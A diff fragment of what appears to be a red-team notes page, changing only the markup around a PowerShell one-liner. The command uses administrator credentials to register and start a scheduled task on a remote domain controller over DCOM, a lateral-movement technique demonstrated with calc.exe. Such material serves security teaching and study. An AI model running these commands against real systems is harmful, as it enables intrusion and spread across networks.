@@ -10,13 +10,11 @@ $a=$null; while($a -eq $null) { $a=Get-ScheduledTask | Where-Object {$_.TaskName
 
 Now from the compromised victim system, let's execute code laterally:
 
-{% tabs %}
-{% tab title="attacker@remote" %}
+{% code title="attacker@remote" %}
 ```csharp
 $connection = New-Cimsession -ComputerName "dc-mantvydas" -SessionOption (New-CimSessionOption -Protocol "DCOM") -Credential ((new-object -typename System.Management.Automation.PSCredential -ArgumentList @("administrator", (ConvertTo-SecureString -String "123456" -asplaintext -force)))) -ErrorAction Stop; register-scheduledTask -action (New-ScheduledTaskAction -execute "calc.exe" -cimSession $connection -WorkingDirectory "c:\windows\system32") -cimSession $connection -taskname "lateral"; start-scheduledtask -CimSession $connection -TaskName "lateral"
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 Graphic showing both of the above commands and also the process ancestry on the target system:
 
